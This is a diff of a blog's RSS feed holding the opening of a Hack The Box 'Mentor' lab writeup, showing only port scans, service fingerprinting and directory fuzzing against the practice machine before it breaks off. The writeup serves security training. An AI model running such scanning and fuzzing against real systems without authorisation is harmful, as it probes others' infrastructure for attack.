@@ -1,20 +1,882 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
-    <title>API Enumeration on Bajo el Teclado</title>
-    <link>//localhost:1313/tags/api-enumeration/</link>
-    <description>Recent content in API Enumeration on Bajo el Teclado</description>
-    <generator>Hugo</generator>
-    <language>es-ES</language>
-    <copyright>&amp;copy; 2024, Andrés Del Cerro</copyright>
+    <title>Bajo el Teclado</title>
+    <link>http://localhost:1313/tags/api-enumeration/</link>
+    <description>Recent content on Bajo el Teclado</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>es</language>
+    <managingEditor>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</managingEditor>
+    <webMaster>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</webMaster>
+    <copyright>© 2024 pointedsec</copyright>
     <lastBuildDate>Thu, 01 Aug 2024 00:00:00 +0000</lastBuildDate>
-    <atom:link href="//localhost:1313/tags/api-enumeration/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="http://localhost:1313/tags/api-enumeration/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Hack The Box: Mentor Writeup | Medium</title>
-      <link>//localhost:1313/writeups/mentor---hackthebox/</link>
-      <pubDate>Thu, 01 Aug 2024 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/writeups/mentor---hackthebox/</guid>
-      <description>Hack The Box: Mentor Writeup Welcome to my detailed writeup of the medium difficulty machine &amp;ldquo;Mentor&amp;rdquo; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.&#xA;TCP Enumeration $ rustscan -a 10.129.228.102 --ulimit 5000 -g 10.129.228.102 -&amp;gt; [22,80] $ nmap -p22,80 -sCV 10.129.228.102 -oN allPorts Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 22:30 CEST Nmap scan report for 10.129.228.102 Host is up (0.</description>
+      <link>http://localhost:1313/writeups/mentor---hackthebox/</link>
+      <pubDate>Thu, 01 Aug 2024 00:00:00 +0000</pubDate><author>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</author>
+      <guid>http://localhost:1313/writeups/mentor---hackthebox/</guid>
+      <description>&lt;h1 id=&#34;hack-the-box-mentor-writeup&#34;&gt;Hack The Box: Mentor Writeup&lt;/h1&gt;
+&lt;p&gt;Welcome to my detailed writeup of the medium difficulty machine &lt;strong&gt;&amp;ldquo;Mentor&amp;rdquo;&lt;/strong&gt; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.&lt;/p&gt;
+&lt;h1 id=&#34;tcp-enumeration&#34;&gt;TCP Enumeration&lt;/h1&gt;
+
+
+
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;1&lt;/span&gt;&lt;span&gt;$ rustscan -a 10.129.228.102 --ulimit &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;5000&lt;/span&gt; -g
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;2&lt;/span&gt;&lt;span&gt;10.129.228.102 -&amp;gt; [22,80]&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 1&lt;/span&gt;&lt;span&gt;$ nmap -p22,80 -sCV 10.129.228.102 -oN allPorts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 2&lt;/span&gt;&lt;span&gt;Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 22:30 CEST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 3&lt;/span&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#fff;font-weight:bold&#34;&gt;for&lt;/span&gt; 10.129.228.102
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 4&lt;/span&gt;&lt;span&gt;Host is up (0.038s latency).
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 5&lt;/span&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 6&lt;/span&gt;&lt;span&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 7&lt;/span&gt;&lt;span&gt;22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;3&lt;/span&gt; (Ubuntu Linux; protocol 2.0)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 8&lt;/span&gt;&lt;span&gt;| ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 9&lt;/span&gt;&lt;span&gt;|   &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;256&lt;/span&gt; c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;10&lt;/span&gt;&lt;span&gt;|_  &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;256&lt;/span&gt; 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;11&lt;/span&gt;&lt;span&gt;80/tcp open  http    Apache httpd 2.4.52
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;12&lt;/span&gt;&lt;span&gt;|_http-title: Did not follow redirect to http://mentorquotes.htb/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;13&lt;/span&gt;&lt;span&gt;|_http-server-header: Apache/2.4.52 (Ubuntu)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;14&lt;/span&gt;&lt;span&gt;Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;15&lt;/span&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;16&lt;/span&gt;&lt;span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;17&lt;/span&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#fff;font-weight:bold&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;1&lt;/span&gt; IP address (&lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;1&lt;/span&gt; host up) scanned in 7.88 seconds&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1 id=&#34;udp-enumeration&#34;&gt;UDP Enumeration&lt;/h1&gt;
+
+
+
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 1&lt;/span&gt;&lt;span&gt;$ sudo nmap --top-ports &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;1500&lt;/span&gt; -sU --min-rate &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;5000&lt;/span&gt; -n -Pn 10.129.228.102 -oN allPorts.UDP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 2&lt;/span&gt;&lt;span&gt;Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 22:32 CEST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 3&lt;/span&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#fff;font-weight:bold&#34;&gt;for&lt;/span&gt; 10.129.228.102
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 4&lt;/span&gt;&lt;span&gt;Host is up (0.039s latency).
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 5&lt;/span&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;1493&lt;/span&gt; open|filtered udp ports (no-response)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 6&lt;/span&gt;&lt;span&gt;PORT      STATE  SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 7&lt;/span&gt;&lt;span&gt;161/udp   open   snmp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 8&lt;/span&gt;&lt;span&gt;1068/udp  closed instl_bootc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 9&lt;/span&gt;&lt;span&gt;17989/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;10&lt;/span&gt;&lt;span&gt;22292/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;11&lt;/span&gt;&lt;span&gt;27064/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;12&lt;/span&gt;&lt;span&gt;31673/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;13&lt;/span&gt;&lt;span&gt;42313/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;14&lt;/span&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;15&lt;/span&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#fff;font-weight:bold&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;1&lt;/span&gt; IP address (&lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;1&lt;/span&gt; host up) scanned in 0.81 seconds&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Detectamos que está el puerto 161/UDP (SNMP) abierto, interesante.&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h1 id="hack-the-box-mentor-writeup">Hack The Box: Mentor Writeup</h1>
+<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Mentor&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ rustscan -a 10.129.228.102 --ulimit <span style="color:#ff0;font-weight:bold">5000</span> -g
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>10.129.228.102 -&gt; [22,80]</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ nmap -p22,80 -sCV 10.129.228.102 -oN allPorts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 22:30 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.228.102
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.038s latency).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu <span style="color:#ff0;font-weight:bold">3</span> (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>|   <span style="color:#ff0;font-weight:bold">256</span> c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>|_  <span style="color:#ff0;font-weight:bold">256</span> 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>80/tcp open  http    Apache httpd 2.4.52
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>|_http-title: Did not follow redirect to http://mentorquotes.htb/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>|_http-server-header: Apache/2.4.52 (Ubuntu)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 7.88 seconds</span></span></code></pre></div>
+<h1 id="udp-enumeration">UDP Enumeration</h1>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ sudo nmap --top-ports <span style="color:#ff0;font-weight:bold">1500</span> -sU --min-rate <span style="color:#ff0;font-weight:bold">5000</span> -n -Pn 10.129.228.102 -oN allPorts.UDP
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 22:32 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.228.102
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.039s latency).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Not shown: <span style="color:#ff0;font-weight:bold">1493</span> open|filtered udp ports (no-response)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT      STATE  SERVICE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>161/udp   open   snmp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>1068/udp  closed instl_bootc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>17989/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>22292/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>27064/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>31673/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>42313/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 0.81 seconds</span></span></code></pre></div>
+<p>Detectamos que está el puerto 161/UDP (SNMP) abierto, interesante.</p>
+<h1 id="http-enumeration--virtual-hosting">HTTP enumeration &amp; Virtual Hosting</h1>
+<p>Detectamos un dominio <code>mentorquotes.htb</code></p>
+<p>Detectamos que el Framework por detrás es <code>Flask</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ whatweb http://mentorquotes.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>http://mentorquotes.htb [<span style="color:#ff0;font-weight:bold">200</span> OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.3 Python/3.6.9], IP[10.129.228.102], Python[3.6.9], Title[MentorQuotes], Werkzeug[2.0.3]</span></span></code></pre></div>
+<p>Tras analizar el código fuente de la página web no encuentro nada interesante. Así que decidí fuzzear en busca de nuevas rutas pero no encontré nada.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ feroxbuster -u http://mentorquotes.htb/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -d <span style="color:#ff0;font-weight:bold">1</span> -t <span style="color:#ff0;font-weight:bold">100</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span> ___  ___  __   __     __      __         __   ___
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>|__  |__  |__) |__) | /  <span style="color:#0ff;font-weight:bold">`</span>    /  <span style="color:#0ff;font-weight:bold">\ \_</span>/ | |  <span style="color:#0ff;font-weight:bold">\ </span>|__
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>|    |___ |  <span style="color:#0ff;font-weight:bold">\ </span>|  <span style="color:#0ff;font-weight:bold">\ </span>| <span style="color:#0ff;font-weight:bold">\_</span>_,    <span style="color:#0ff;font-weight:bold">\_</span>_/ / <span style="color:#0ff;font-weight:bold">\ </span>| |__/ |___
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>by Ben <span style="color:#0ff;font-weight:bold">&#34;epi&#34;</span> Risher 🤓                 ver: 2.10.4
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>───────────────────────────┬──────────────────────
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span> 🎯  Target Url            │ http://mentorquotes.htb/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span> 🚀  Threads               │ <span style="color:#ff0;font-weight:bold">100</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span> 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span> 👌  Status Codes          │ All Status Codes!
